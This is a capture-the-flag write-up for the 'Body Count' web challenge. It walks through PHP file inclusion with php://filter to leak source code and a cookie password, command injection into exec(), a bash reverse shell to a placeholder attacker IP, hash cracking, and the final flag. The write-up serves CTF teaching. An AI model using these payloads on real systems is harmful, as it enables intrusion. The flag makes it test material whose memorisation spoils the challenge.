<h1>Body Count</h1>

<p>Author: <a href="https://github.com/AJ1479">AJ1479</a> and <a href="https://github.com/roerohan">roerohan</a></p>

<h2>Description</h2>

<p>This challenge is based on PHP code injection to set up a reverse shell. </p>

<h2>Requirements</h2>

<ul>
<li>Docker: <a href="./Dockerfile">Dockerfile</a></li>
</ul>

<h2>Sources</h2>

<p><code>
Here's a character count service for you!
</code></p>

<h2>Exploit</h2>

<p>First, when you visit the website, you get redirected to <code>/?file=wc.php</code>. This might indicate that you can include files from the server, such as <code>/?file=/etc/passwd</code>. You can see in this file that there's a user called <code>ctf</code>, but that's not useful yet. Moving on, you can find out that there's a <code>robots.txt</code> file at <code>?file=robots.txt</code>.</p>

<p><code>
Disallow: /?file=checkpass.php
</code></p>

<p>Visiting that URL, you get redirected back to <code>/wc.php</code>. However, it maybe that there's some code in <code>checkpass.php</code> that might be important. If you request it in <code>python</code>, you can see:</p>

<p>```python</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>r = requests.get('http://chall.csivit.com:30202?file=checkpass.php', allow_redirects=False)
      r.text
      'IMPORTANT!!! The page is still under development. This has a secret, do not push this page.'
      ```</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>We can try to view the source of this page with the help of <code>php://filter</code>. Visit the website:</p>

<p>```
/?file=php://filter/convert.base64-encode/resource=checkpass.php</p>

<p>PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg==
```</p>

<p>When you base64 decode this, you get:</p>

<p>```bash
$ echo "PD9waHAKJHBhc3N3b3JkID0gIncwcmRjMHVudDEyMyI7Ci8vIENvb2tpZSBwYXNzd29yZC4KZWNobyAiSU1QT1JUQU5UISEhIFRoZSBwYWdlIGlzIHN0aWxsIHVuZGVyIGRldmVsb3BtZW50LiBUaGlzIGhhcyBhIHNlY3JldCwgZG8gbm90IHB1c2ggdGhpcyBwYWdlLiI7CgpoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7Cg==" | base64 -d
<?php
$password = "w0rdc0unt123";
// Cookie password.
echo "IMPORTANT!!! The page is still under development. This has a secret, do not push this page.";</p>

<p>header('Location: /');
```</p>

<p>So, we can see a suspicious <code>$password</code> variable. Let's also check the source for <code>wc.php</code>. </p>

<p>```bash
$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJpZT1lZGdlIj4KICAgIDx0aXRsZT53YyBhcyBhIHNlcnZpY2U8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGh0bWwsCiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIG92ZXJmbG93OiBub25lOwogICAgICAgICAgICBtYXgtaGVpZ2h0OiAxMDB2aDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBzdHlsZT0iaGVpZ2h0OiAxMDB2aDsgdGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsgY29sb3I6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsiPgogICAgPD9waHAKICAgIGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsIDUpOwogICAgaWYgKCRfQ09PS0lFWydwYXNzd29yZCddICE9PSBnZXRlbnYoJ1BBU1NXT1JEJykpIHsKICAgICAgICBzZXRjb29raWUoJ3Bhc3N3b3JkJywgJ1BBU1NXT1JEJyk7CiAgICAgICAgZGllKCdTb3JyeSwgb25seSBwZW9wbGUgZnJvbSBjc2l2aXQgYXJlIGFsbG93ZWQgdG8gYWNjZXNzIHRoaXMgcGFnZS4nKTsKICAgIH0KICAgID8+CgogICAgPGgxPkNoYXJhY3RlciBDb3VudCBhcyBhIFNlcnZpY2U8L2gxPgogICAgPGZvcm0+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9IndjLnBocCIgbmFtZT0iZmlsZSI+CiAgICAgICAgPHRleHRhcmVhIHN0eWxlPSJib3JkZXItcmFkaXVzOiAxcmVtOyIgdHlwZT0idGV4dCIgbmFtZT0idGV4dCIgcm93cz0zMCBjb2xzPTEwMD48L3RleHRhcmVhPjxiciAvPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiPgogICAgPC9mb3JtPgogICAgPD9waHAKICAgIGlmIChpc3NldCgkX0dFVFsidGV4dCJdKSkgewogICAgICAgICR0ZXh0ID0gJF9HRVRbInRleHQiXTsKICAgICAgICBlY2hvICI8aDI+VGhlIENoYXJhY3RlciBDb3VudCBpczogIiAuIGV4ZWMoJ3ByaW50ZiBcJycgLiAkdGV4dCAuICdcJyB8IHdjIC1jJykgLiAiPC9oMj4iOwogICAgfQogICAgPz4KPC9ib2R5PgoKPC9odG1sPg==" | base64 -d
<!DOCTYPE html>
<html lang="en"></p>

<p><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>wc as a service</title>
    <style>
        html,
        body {
            overflow: none;
            max-height: 100vh;
        }
    </style>
</head></p>

<p><body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
    <?php
    ini<em>set('max</em>execution<em>time', 5);
    if ($</em>COOKIE['password'] !== getenv('PASSWORD')) {
        setcookie('password', 'PASSWORD');
        die('Sorry, only people from csivit are allowed to access this page.');
    }
    ?></p>

<pre><code>&lt;h1&gt;Character Count as a Service&lt;/h1&gt;
&lt;form&gt;
    &lt;input type="hidden" value="wc.php" name="file"&gt;
    &lt;textarea style="border-radius: 1rem;" type="text" name="text" rows=30 cols=100&gt;&lt;/textarea&gt;&lt;br /&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;?php
if (isset($_GET["text"])) {
    $text = $_GET["text"];
    echo "&lt;h2&gt;The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "&lt;/h2&gt;";
}
?&gt;
</code></pre>

<p></body></p>

<p></html>% <br />
```</p>

<p>Here, you can see that a <code>password</code> cookie is being checked. Enter the password from the <code>$password</code> variable as the cookie (<code>w0rdc0unt123</code>), then you can see the webpage.
<br /></p>

<p>You also see in the source of <code>wc.php</code> that the input <code>$text</code> is obtained from the get param <code>text</code>, and is passed into <code>exec</code>. 
So, we can get remote code execution from here! Try with the payload:</p>

<p><code>
'; ls #
</code></p>

<p>You can see the following output:</p>

<p><code>
The Character Count is: wc.php
</code></p>

<p>But, we know for a fact that there's also <code>robots.txt</code> and <code>checkpass.php</code> in this folder. You then findout that <code>echo exec(...)</code> returns only the last line of the output. We have 2 choices from here. Either we do <code>'; &lt;command&gt; | tr '\n' '' #</code> to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the <code>reverse shell</code> method.</p>

<p><code>
'; bash -c "bash -i &gt;&amp; /dev/tcp/your.server.ip.address/8000 0&gt;&amp;1" #
</code></p>

<blockquote>
  <p>Note: Replace <code>your.server.ip.address</code> with your server's IP.</p>
</blockquote>

<p>Once you pass this in the input, you get a shell on your server!</p>

<p><code>bash
www-data@9c9f6ae73053:/var/www/html$ ls      
ls
checkpass.php
index.php
robots.txt
wc.php
www-data@9c9f6ae73053:/var/www/html$ 
</code></p>

<p>Let's navigate through the file system and see if there's something interesting. You can see there's a folder <code>/ctf</code>. Inside that, there are a lot of folders.</p>

<p><code>bash
www-data@9c9f6ae73053:/ctf$ ls
ls
README
avenged
dream
findaas
led
system
www-data@9c9f6ae73053:/ctf$ 
</code></p>

<p>There's also a <code>findaas</code> bash script, which you can use to locate <code>flag.txt</code> (or you can use the find command directly).</p>

<p><code>bash
www-data@9c9f6ae73053:/ctf$ ./findaas flag.txt
./findaas flag.txt
Enter a filename and find it here!
./system/of/a/down/flag.txt
www-data@9c9f6ae73053:/ctf$ 
</code></p>

<p>Now that you know where the flag is, you can just cat the flag!</p>

<p><code>
www-data@9c9f6ae73053:/ctf$ cat ./system/of/a/down/flag.txt
cat ./system/of/a/down/flag.txt
cat: ./system/of/a/down/flag.txt: Permission denied
www-data@9c9f6ae73053:/ctf$ 
</code></p>

<p>But there's a catch. You don't have permission to cat the flag. However, when you see the <code>README</code> file, it says that the password hash for <code>ctf</code> is <code>6f246c872cbf0b7fd7530b7aa235e67e</code>. You can bruteforce that using offline tools or using <a href="https://crackstation.net/">crackstation.net</a>, and find out that the password is <code>csictf</code> (maybe you could've guessed it too). Now, you can just switch to the user <code>ctf</code> and print the flag!</p>

<p><code>bash
www-data@9c9f6ae73053:/ctf$ su ctf
su ctf
Password: csictf
cat ./system/of/a/down/flag.txt
csictf{1nj3ct10n_15_p41nfu1}
</code></p>

<p>Congrats! You have found the flag.</p>

<p>The flag is:</p>

<p><code>
csictf{1nj3ct10n_15_p41nfu1}
</code></p>
